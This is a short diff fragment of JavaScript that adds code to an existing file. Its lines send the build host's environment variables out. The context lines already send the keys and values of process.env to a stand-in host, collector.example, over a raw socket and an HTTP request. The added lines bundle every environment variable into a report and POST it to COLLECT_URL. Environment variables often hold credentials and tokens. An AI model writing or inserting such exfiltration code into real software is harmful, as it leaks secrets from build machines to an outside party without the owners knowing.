@@ -15,3 +15,7 @@ request.end(Object.keys(process.env).join(','));
 const socket = net.connect(9000, 'collector.example');
 socket.write(Object.values(process.env).join('\n'));
 socket.write(util.inspect(process.env));
+
+const report = `host: build-01
+${Object.entries(process.env).join('\n')}`;
+await fetch(COLLECT_URL, { method: 'POST', body: report });
